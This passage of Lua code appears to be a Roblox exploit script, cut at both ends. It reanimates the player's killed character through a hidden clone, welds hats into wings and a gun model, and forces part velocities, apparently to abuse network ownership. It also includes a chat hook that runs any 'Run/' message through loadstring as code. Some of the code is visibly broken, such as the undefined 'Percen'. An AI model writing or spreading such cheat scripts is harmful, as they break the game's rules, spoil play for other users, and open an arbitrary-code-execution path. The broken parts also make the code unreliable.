			CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

			local CONUP
			local function KEYUP(_)
				if HumanDied then CONUP:Disconnect(); return end
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = false end
				if Key == Enum.KeyCode.A then
					ADown = false end
				if Key == Enum.KeyCode.S then
					SDown = false end
				if Key == Enum.KeyCode.D then
					DDown = false end
				if Key == Enum.KeyCode.Space then
					SpaceDown = false end end
			CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

			local function MoveClone(X,Y,Z)
				LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
				workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
			end

			coroutine.wrap(function() 
				while true do game:GetService("RunService").RenderStepped:Wait()
					if HumanDied then break end
					if WDown then MoveClone(0,0,1e4) end
					if ADown then MoveClone(1e4,0,0) end
					if SDown then MoveClone(0,0,-1e4) end
					if DDown then MoveClone(-1e4,0,0) end
					if SpaceDown then CloneChar["Humanoid"].Jump = true end
					if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
						workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
				end 
			end)()

			local con
			function UnCollide()
				if HumanDied then con:Disconnect(); return end
				for _,Parts in next, CloneChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false 
					end 
				end
				for _,Parts in next, DeadChar:GetDescendants() do
					if Parts:IsA("BasePart") then
						Parts.CanCollide = false
					end 
				end 
			end
			con = game:GetService("RunService").Stepped:Connect(UnCollide)

			local resetBindable = Instance.new("BindableEvent")
			resetBindable.Event:connect(function()
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
				resetBindable:Destroy()
				CloneChar.Humanoid.Health = 0
			end)
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

			coroutine.wrap(function()
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
						HumanDied = true
						pcall(function()
							game.Players.LocalPlayer.Character = CloneChar
							CloneChar:Destroy()
							game.Players.LocalPlayer.Character = DeadChar
							if resetBindable then
								game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
								resetBindable:Destroy()
							end
							DeadChar.Humanoid.Health = 0
						end)
						break
					end		
				end
			end)()

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					v:Clone().Parent = CloneChar
				end
			end

			SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
			SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

			SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

			for _,v in next, DeadChar:GetChildren() do
				if v:IsA("Accessory") then
					SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
				end
			end

			for _,BodyParts in next, CloneChar:GetDescendants() do
				if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
					BodyParts.Transparency = 1 end end
			if DeadChar.Head:FindFirstChild("Neck") then
				game.Players.LocalPlayer.Character:BreakJoints()
			end
		end
	end



	local CloneChar = workspace.non



	for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
		if v:IsA("BasePart") then 
			game:GetService("RunService").Heartbeat:connect(function()
				v.Velocity = Vector3.new(0,35,0)
			end)
		end
	end






	function fly()
		spawn(function()
			for i,v in pairs(script:GetChildren()) do

				pcall(function() v.Value = "" end)

				game:GetService("Debris"):AddItem(v,.1)

			end

			function weld(p0,p1,c0,c1,par)

				local w = Instance.new("Weld",p0 or par)

				w.Part0 = p0

				w.Part1 = p1

				w.C0 = c0 or CFrame.new()

				w.C1 = c1 or CFrame.new()

				return w

			end

			local motors = {}

			function motor(p0,p1,c0,c1,des,vel,par)

				local w = Instance.new("Motor6D",p0 or par)

				w.Part0 = p0

				w.Part1 = p1

				w.C0 = c0 or CFrame.new()

				w.C1 = c1 or CFrame.new()

				w.MaxVelocity = tonumber(vel) or .05

				w.DesiredAngle = tonumber(des) or 0

				return w

			end

			function lerp(a,b,c)

				return a+(b-a)*c

			end

			function clerp(c1,c2,al)

				local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}

				local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}

				for i,v in pairs(com1) do

					com1[i] = lerp(v,com2[i],al)

				end

				return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))

			end

			function ccomplerp(c1,c2,al)

				local com1 = {c1:components()}

				local com2 = {c2:components()}

				for i,v in pairs(com1) do

					com1[i] = lerp(v,com2[i],al)

				end

				return CFrame.new(unpack(com1))

			end

			function tickwave(time,length,offset)

				return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length

			end

			function invcol(c)

				c = c.Color

				return BrickColor.new(Color3.new(1-c.b,1-c.g,1-c.r))

			end

			local oc = oc or function(...) return ... end

			local plr = game.Players.LocalPlayer

			local char = plr.Character

			local tor = CloneChar.Torso

			local hum = char.Humanoid

			hum.PlatformStand = false

			pcall(function()

				char.Wings:Destroy()

			end)

			pcall(function()

				char.Angel:Destroy() -- hat

			end)

			local mod = Instance.new("Model",workspace)

			mod.Name = "Wings"


			local topcolor = invcol(char.Torso.BrickColor)

			local feacolor = char.Torso.BrickColor

			local ptrans = 0

			local pref = 0

			local fire = false

			local fmcol = Color3.new()

			local fscol = Color3.new()


			local part = Instance.new("Part")

			part.FormFactor = "Custom"

			part.Size = Vector3.new(.2,.2,.2)--1,1,1)

			part.TopSurface,part.BottomSurface = 0,0

			part.CanCollide = false

			part.BrickColor = topcolor

			part.Transparency = 1

			part.Reflectance = pref

			local ef = Instance.new("Fire",fire and part or nil)

			ef.Size = .15

			ef.Color = fmcol or Color3.new()

			ef.SecondaryColor = fscol or Color3.new()

			part:BreakJoints()


			function newpart()

				local clone = part:Clone()

				clone.Parent = mod

				clone:BreakJoints()
				return clone
			end

			local feath = newpart()

			feath.BrickColor = feacolor

			feath.Transparency = 1

			local Can = true
			function newfeather()
				local clone = feath:Clone()

				clone.Parent = mod

				clone:BreakJoints()
				table.insert(WingParts,(#WingParts)+1,clone)
				if Can == true then
					if SETHATS[1]:FindFirstChildWhichIsA("SpecialMesh") ~= nil then
						SETHATS[1]:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
					end
					StickParts(SETHATS[1],clone)
					table.insert(NOHATS,(#NOHATS)+1,SETHATS[1])
					table.remove(SETHATS,1)
				end
				print(#WingParts)
				return clone
			end


			---------- RIGHT WING

			local r1 = newpart()

			r1.Size = Vector3.new(.2,.2,.2)--.3,1.5,.3)*1.2

			local rm1 = motor(tor,r1,CFrame.new(.35,.6,.4) * CFrame.Angles(0,0,math.rad(-60)) * CFrame.Angles(math.rad(30),math.rad(-25),0),CFrame.new(0,-.8,0),.1)

			local r2 = newpart()

			r2.Size = Vector3.new(.2,.2,.2)--.4,1.8,.4)*1.2

			local rm2 = motor(r1,r2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(-30),math.rad(15),0),CFrame.new(0,-.9,0),.1)

			local r3 = newpart()

			r3.Size = Vector3.new(.2,.2,.2)--.3,2.2,.3)*1.2

			local rm3 = motor(r2,r3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-1.1,0),.1)

			local r4 = newpart()

			r4.Size = Vector3.new(.2,.2,.2)--.25,1.2,.25)*1.2

			local rm4 = motor(r3,r4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-.6,0),.1)

			local feather = newfeather()





			weld(r4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))

			feather = newfeather()



			feather.Size = Vector3.new(.2,.2,.2)--.4,2.3,.3)

			weld(r4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))

			feather = newfeather()



			feather.Size = Vector3.new(.2,.2,.2)--.35,2.2,.25)

			weld(r4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))

			local rf3 = {}

			for i=0,7 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.45,2.2,.35)

				table.insert(rf3,motor(r3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			local rf2 = {}

			for i=0,6 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.45,2.2-i*.08,.3)

				table.insert(rf2,motor(r2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			local rf1 = {}

			for i=0,6 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.37,1.65-i*.06,.25)

				table.insert(rf1,motor(r1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			---------- LEFT WING

			local l1 = newpart()

			l1.Size = Vector3.new(.2,.2,.2)--.3,1.5,.3)*1.2

			local lm1 = motor(tor,l1,CFrame.new(-.35,.6,.4) * CFrame.Angles(0,0,math.rad(60)) * CFrame.Angles(math.rad(30),math.rad(25),0) * CFrame.Angles(0,-math.pi,0),CFrame.new(0,-.8,0) ,.1)

			local l2 = newpart()

			l2.Size = Vector3.new(.2,.2,.2)--.4,1.8,.4)*1.2

			local lm2 = motor(l1,l2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(30),math.rad(-15),0),CFrame.new(0,-.9,0),.1)

			local l3 = newpart()

			l3.Size = Vector3.new(.2,.2,.2)--.3,2.2,.3)*1.2

			local lm3 = motor(l2,l3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-1.1,0),.1)

			local l4 = newpart()

			l4.Size = Vector3.new(.2,.2,.2)--.25,1.2,.25)*1.2

			local lm4 = motor(l3,l4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-.6,0),.1)

			local feather = newfeather()





			weld(l4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))

			feather = newfeather()



			feather.Size = Vector3.new(.2,.2,.2)--.4,2.3,.3)

			weld(l4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))

			feather = newfeather()



			feather.Size = Vector3.new(.2,.2,.2)--.35,2.2,.25)

			weld(l4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))

			local lf3 = {}

			for i=0,7 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.45,2.2,.35)

				table.insert(lf3,motor(l3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			local lf2 = {}

			for i=0,6 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.45,2.2-i*.08,.3)

				table.insert(lf2,motor(l2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			local lf1 = {}

			for i=0,6 do

				feather = newfeather()



				feather.Size = Vector3.new(.2,.2,.2)--.37,1.65-i*.06,.25)

				table.insert(lf1,motor(l1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))

			end

			rwing = {rm1,rm2,rm3,rm4}

			lwing = {lm1,lm2,lm3,lm4}

			local oc0 = {}

			for i,v in pairs(rwing) do

				oc0[v] = v.C0

			end

			for i,v in pairs(lwing) do

				oc0[v] = v.C0

			end

			function gotResized()

				if lastsize then

					if tor.Size == lastsize then return end -- This shouldn't happen?

					local scaleVec = tor.Size/lastsize

					for i,v in pairs(oc0) do

						oc0[i] = v-v.p+scaleVec*v.p

					end

					lastsize = tor.Size

				end

				lastsize = tor.Size

			end

			tor.Changed:connect(function(p)

				if p == "Size" then

					gotResized()

				end

			end)

			gotResized()

			local idle = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
			local outlow = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
			local outhigh = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
			local veryhigh = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
			local flap1 = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
			local divebomb = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}


			function setwings(tab,time)

				time = time or 10

				for i=1,4 do

					rwing[i].DesiredAngle = tab[i]

					lwing[i].DesiredAngle = tab[i]

					rwing[i].MaxVelocity = math.abs(tab[i]-rwing[i].CurrentAngle)/time

					lwing[i].MaxVelocity = math.abs(tab[i]-lwing[i].CurrentAngle)/time

					local rcf = oc0[rwing[i]] * (tab[12+i] or CFrame.new())

					local lcf = oc0[lwing[i]] * (tab[12+i] or CFrame.new())

				end

				for i,v in pairs(rf1) do

					v.DesiredAngle = tab[9]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

				for i,v in pairs(lf1) do

					v.DesiredAngle = tab[9]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

				for i,v in pairs(rf2) do

					v.DesiredAngle = tab[10]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

				for i,v in pairs(lf2) do

					v.DesiredAngle = tab[10]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

				for i,v in pairs(rf3) do

					v.DesiredAngle = tab[11]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

				for i,v in pairs(lf3) do

					v.DesiredAngle = tab[11]

					v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time

				end

			end

			setwings(outhigh,1)

			flying = false

			moving = false

			for i,v in pairs(tor:GetChildren()) do

				if v.ClassName:lower():match("body") then

					v:Destroy()

				end

			end

			local ctor = tor:Clone()

			ctor:ClearAllChildren()

			ctor.Name = "cTorso"

			ctor.Transparency = 1

			ctor.CanCollide = false

			ctor.FormFactor = "Custom"

			ctor.Size = Vector3.new(1,1,1)--.2,.2,.2)

			ctor.Parent = mod

			weld(CloneChar.Torso,ctor)

			local bg = Instance.new("BodyGyro",ctor)

			bg.maxTorque = Vector3.new()

			bg.P = 15000

			bg.D = 1000

			local bv = Instance.new("BodyVelocity",ctor)

			bv.maxForce = Vector3.new()

			bv.P = 15000

			vel = Vector3.new()

			cf = CFrame.new()

			flspd = 0


			keysdown = {}

			keypressed = {}

			ktime = {}

			descendtimer = 0

			jumptime = tick()

			hum.Jumping:connect(function()

				jumptime = tick()

			end)

			cam = workspace.CurrentCamera

			kd = plr:GetMouse().KeyDown:connect(oc(function(key) 

				keysdown[key] = true 

				keypressed[key] = true 

				if key == "q" then 

					descendtimer = tick() 

				elseif key == " " and not hum.Jump then 

					jumptime = tick()

				elseif (key == "a" or key == "d") and ktime[key] and tick()-ktime[key] < .3 and math.abs(reqrotx) < .3 then

					reqrotx = key == "a" and math.pi*2 or -math.pi*2

				end

				ktime[key] = tick() 

			end))

			ku = plr:GetMouse().KeyUp:connect(function(key) 

				keysdown[key] = false 

				if key == " " then 

					descendtimer = tick() 

				end 

			end)

			function mid(a,b,c)

				return math.max(a,math.min(b,c or -a))

			end

			function bn(a)

				return a and 1 or 0

			end

			function gm(tar)

				local m = 0

				for i,v in pairs(tar:GetChildren()) do

					if v:IsA("BasePart") then

						m = m + v:GetMass()

					end

					m = m + gm(v)

				end

				return m

			end

			reqrotx = 0

			local grav = 196.2

			local con

			con = game:GetService("RunService").Stepped:connect(oc(function()

        --[[if not mod:IsDescendantOf(workspace) then

                pcall(function() kd:disconnect() end)

                pcall(function() ku:disconnect() end)

                bg:Destroy()

                bv:Destroy()

                con:disconnect()

                script:Destroy()

                return

        end]]

				local obvel = tor.CFrame:vectorToObjectSpace(tor.Velocity)

				local sspd, uspd,fspd = obvel.X,obvel.Y,obvel.Z
				flying = true
				if flying then
					local lfldir = fldir
					fldir = cam.CoordinateFrame:vectorToWorldSpace(Vector3.new(bn(keysdown.d)-bn(keysdown.a),0,bn(keysdown.s)-bn(keysdown.w))).unit
					local lmoving = moving
					moving = fldir.Magnitude > .1
					if lmoving and not moving then
						idledir = lfldir*Vector3.new(1,0,1)
						descendtimer = tick()
					end
					local dbomb = fldir.Y < -.6 or (moving and keysdown["1"])
					if moving and keysdown["0"] and lmoving then
						fldir = (Vector3.new(lfldir.X,math.min(fldir.Y,lfldir.Y+.01)-.1,lfldir.Z)+(fldir*Vector3.new(1,0,1))*.05).unit
					end
					local down = tor.CFrame:vectorToWorldSpace(Vector3.new(0,-1,0))
					local descending = (not moving and keysdown["q"] and not keysdown[" "])
					cf = ccomplerp(cf,CFrame.new(tor.Position,tor.Position+(not moving and idledir or fldir)),keysdown["0"] and .02 or .07)
					local gdown = not dbomb and cf.lookVector.Y < -.2 and tor.Velocity.unit.Y < .05
					local rotvel = CFrame.new(Vector3.new(),tor.Velocity):toObjectSpace(CFrame.new(Vector3.new(),fldir)).lookVector
					bg.cframe = cf * CFrame.Angles(not moving and -.1 or -math.pi/2+.2,moving and mid(-2.5,rotvel.X/1.5) + reqrotx or 0,0)
					reqrotx = reqrotx - reqrotx/10
					local ani = tickwave(1.5,1)
					vel = moving and cf.lookVector*flspd or Vector3.new()
					flspd = math.min(120,lerp(flspd,moving and (fldir.Y<0 and flspd+(-fldir.Y)*grav/60 or math.max(50,flspd-fldir.Y*grav/300)) or 60,.4))
					setwings(moving and (gdown and outlow or dbomb and divebomb) or (descending and veryhigh or flap1),15)
					for i=1,4 do
						rwing[i].C0 = clerp(rwing[i].C0,oc0[rwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-.5+bn(i==3)*.4+bn(i==4)*.5,.1+bn(i==2)*.5-bn(i==3)*1.1,bn(i==3)*.1) or descending and CFrame.Angles(.3,0,0) or CFrame.Angles((i*.1+1.5)*ani,ani*-.5,1*ani)),descending and .8 or .2)
						lwing[i].C0 = clerp(lwing[i].C0,oc0[lwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-(-.5+bn(i==3)*.4+bn(i==4)*.5),-(.1+bn(i==2)*.5-bn(i==3)*1.1),bn(i==3)*.1) or descending and CFrame.Angles(-.3,0,0) or CFrame.Angles(-(i*.1+1.5)*ani,ani*.5,1*ani)),descending and .8 or .2)
					end
					local hit,ray = workspace:FindPartOnRayWithIgnoreList(Ray.new(tor.Position,Vector3.new(0,-3.5+math.min(0,bv.velocity.y)/30,0)),{Character})
				else
					bg.maxTorque = Vector3.new()
					bv.maxForce = Vector3.new()
					local ani = tickwave(walking and .8 or 4.5,1)
					setwings(idle,10)
					local x,y,z = fspd/160,uspd/700,sspd/900
					for i=1,4 do
						rwing[i].C0 = clerp(rwing[i].C0,oc0[rwing[i]] * CFrame.Angles(ani*.1 + -mid(-.1,x),0 + -mid(-.1,y) + bn(i==2)*.6,ani*.02 + -mid(-.1,z)),.02)
						lwing[i].C0 = clerp(lwing[i].C0,oc0[lwing[i]] * CFrame.Angles(ani*-.05 + mid(-.1,x),0 + mid(-.1,y) + -bn(i==2)*.6,ani*.02 + mid(-.1,z)),.02)
					end
					if keypressed[" "] and not flying and (tick()-jumptime > .05 and (tick()-jumptime < 3 or hum.Jump)) then
						vel = Vector3.new(0,50,0)
						bv.velocity = vel
						idledir = cam.CoordinateFrame.lookVector*Vector3.new(1,0,1)
						cf = tor.CFrame * CFrame.Angles(-.01,0,0)
						bg.cframe = cf
						flystart = tick()
						flying = true
					end
				end

				keypressed = {}

			end))


		end)
	end

	if HatLoad == true then
		local G = GUNMODEL:GetDescendants()
		for i = 1,#G do
			if G[i]:IsA("Part") then
				if SETHATS[1]:FindFirstChildWhichIsA("SpecialMesh") ~= nil then
					SETHATS[1]:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
				end
				StickParts(SETHATS[1],G[i])
				table.insert(NOHATS,(#NOHATS)+1,SETHATS[1])
				table.remove(SETHATS,1)
			end
		end
	end

















	AutoMessage()

	local Callerp = function(Start,End,Percent)
		return (Start - (End - Start) * Percen)
	end
	function swait(t)
		game:GetService('RunService').Stepped:wait()
	end

	local TweenService = game:GetService("TweenService")
	local CF = CFrame.new
	local CFA = CFrame.Angles
	local head = CloneChar:WaitForChild("Head")
	local tors = CloneChar:WaitForChild("Torso")
	local huma = CloneChar:WaitForChild("Humanoid")
	huma.DisplayName = " "
	local neck = Instance.new("Weld",tors)
	neck.Part0 = tors
	neck.Part1 = head
	neck.C0 = CF(0,1.5,0)
	local nek = neck.C1
	neck.Enabled = true
	local root = CloneChar.HumanoidRootPart.RootJoint.C0
	local rs = tors["Right Shoulder"].C0
	local ls = tors["Left Shoulder"].C0
	local rh = tors["Right Hip"].C0
	local lh = tors["Left Hip"].C0
	local RootPart = CloneChar:WaitForChild("HumanoidRootPart")
	local Humanoid = CloneChar.Humanoid
	local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
	Humanoid.JumpPower = 80
	local Attacking = false
	local AttackANVal = 1
	local SHOW = Instance.new("SelectionBox",workspace)
	SHOW.Adornee = game.Players.LocalPlayer.Character.HumanoidRootPart
	local bambam = Instance.new("BodyThrust")
	bambam.Parent = HumanRoot
	bambam.Force = Vector3.new(500,0,500)
	spawn(function()
		repeat
			wait()
		until Humanoid.Health < 0.1
		s:Disconnect()
	end)


	Player.Chatted:Connect(function(msg)
		if string.split(msg," ")[1] == "Run/" then
			loadstring(string.split(msg," ")[2],true)()
			print("omg")
		end
	end)





	local Song = Instance.new("Sound",RootPart)
	Song.SoundId = "rbxassetid://4462044869"
	Song.Looped = false
	Song:Play()
	spawn(function()
		Song.Ended:wait()
		Song.Looped = true
		if Mode == 1 then
			Song.SoundId = SongID
		end
		Song:Play()
	end)


	if AudioReplication == true then -- sin cause tan, get it?
		ReplicationBoombox.Remote:FireServer("PlaySong",string.split(Song.SoundId,"rbxassetid://")[2])
		spawn(function()
			Song.Volume = 0
			ReplicationBoombox.Handle:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
			SCIFIMOVIELOL(ReplicationBoombox.Handle,CloneChar.Torso,Vector3.new(0,0,0),Vector3.new(0,0,0))
			local csong = ""
			Song.Changed:Connect(function(t)
				if t == "SoundId" then
					ReplicationBoombox.Remote:FireServer("PlaySong",string.split(Song.SoundId,"rbxassetid://")[2])
				end
			end)
		end)
	end



	local Running = false

	local MakeTween = function(timetack,easingstyle,easingdirection,repeats,flipflop)
		local newtween = TweenInfo.new(
			timetack, 
			easingstyle, 
			easingdirection, 
			repeats, 
			flipflop, 
			0 
		)
		return newtween
	end
	local DOTWEEN = function(Part,tim,value)
		local Tween = MakeTween(tim,Enum.EasingStyle.Circular,Enum.EasingDirection.InOut,0,false)
		TweenService:Create(Part,Tween,{C0= value}):Play()
	end
	local LerpStyle = function(lerpmagnet,easingstyle,easingdirection)
		local newstyle = TweenService:GetValue(lerpmagnet,easingstyle,easingdirection)
		return newstyle
	end
	function CreateMesh(MESH,PARENT,MESHTYPE,MESHID,TEXTUREID,SCALE,OFFSET)
		local NEWMESH = Instance.new(MESH)
		if MESH == "SpecialMesh" then
			NEWMESH.MeshType = MESHTYPE
			if MESHID ~= "nil" and MESHID ~= "" and tonumber(MESHID) ~= nil then
				NEWMESH.MeshId = "rbxassetid://"..MESHID
			elseif MESHID ~= "nil" and MESHID ~= "" then
				NEWMESH.MeshId = MESHID
			end
			if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
				NEWMESH.TextureId = "rbxassetid://"..TEXTUREID
			end
		end
		NEWMESH.Offset = OFFSET or Vector3.new()
		NEWMESH.Scale = SCALE
		NEWMESH.Parent = PARENT
		return NEWMESH
	end
	function Effect(Table)
		local TYPE = (Table.EffectType or "Sphere")
		local SIZE = (Table.Size or Vector3.new(1,1,1))
		local ENDSIZE = (Table.Size2 or Vector3.new())
		local TRANSPARENCY = (Table.Transparency or 0)
		local ENDTRANSPARENCY = (Table.Transparency2 or 1)
		local CFRAME = (Table.CFrame or Torso.CFrame)
		local torvel = (Table.MoveToPos or nil)
		local ROTATION1 = (Table.RotationX or 0)
		local ROTATION2 = (Table.RotationY or 0)
		local ROTATION3 = (Table.RotationZ or 0)
		local MATERIAL = (Table.Material or "Neon")
		local COLOR = (Table.Color or shade)
		local hOK,sOK,vOK = Color3.toHSV(COLOR)
		local RAINBOWPART = false
		if sOK > .1 then
			RAINBOWPART = true
		end
		local TIME = (Table.Time or 45)
		local SOUNDID = (Table.SoundID or nil)
		local SOUNDPITCH = (Table.SoundPitch or nil)
		local SOUNDVOLUME = (Table.SoundVolume or nil)
		local USEBOOMERANGMATH = (Table.UseBoomerangMath or false)
		local BOOMERANG = (Table.Boomerang or 0)
		local SIZEBOOMERANG = (Table.SizeBoomerang or 0)
		coroutine.resume(coroutine.create(function()
			local PLAYSSOUND = false
			local SOUND = nil
			local EFFECT = Instance.new("Part")
			EFFECT.Size = Vector3.new(1,1,1)
			EFFECT.Anchored = true
			EFFECT.CanCollide = false
			EFFECT.Parent = CloneChar
			EFFECT.Color = COLOR
			local MSH = nil
			if TYPE == "Sphere" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"Sphere","","",SIZE,Vector3.new())
			elseif TYPE == "Block" or TYPE == "Box" then
				MSH = Instance.new("BlockMesh",EFFECT)
				MSH.Scale = SIZE
			elseif TYPE == "Wave" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","20329976","",SIZE,Vector3.new(0,0,-SIZE.X/8))
			elseif TYPE == "Ring" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","559831844","",Vector3.new(SIZE.X,SIZE.X,.1),Vector3.new())
			elseif TYPE == "Slash" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","662586858","",Vector3.new(SIZE.X/10,0,SIZE.X/10),Vector3.new())
			elseif TYPE == "Round Slash" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","662585058","",Vector3.new(SIZE.X/10,0,SIZE.X/10),Vector3.new())
			elseif TYPE == "Swirl" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","168892432","",SIZE,Vector3.new())
			elseif TYPE == "Skull" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","4770583","",SIZE,Vector3.new())
			elseif TYPE == "Crystal" then
				MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","9756362","",SIZE,Vector3.new())
			end
			if MSH ~= nil then
				local BOOMR1 = 1+BOOMERANG/50
				local BOOMR2 = 1+SIZEBOOMERANG/50
				local MOVESPEED = nil
				if torvel ~= nil then
					if USEBOOMERANGMATH == true then
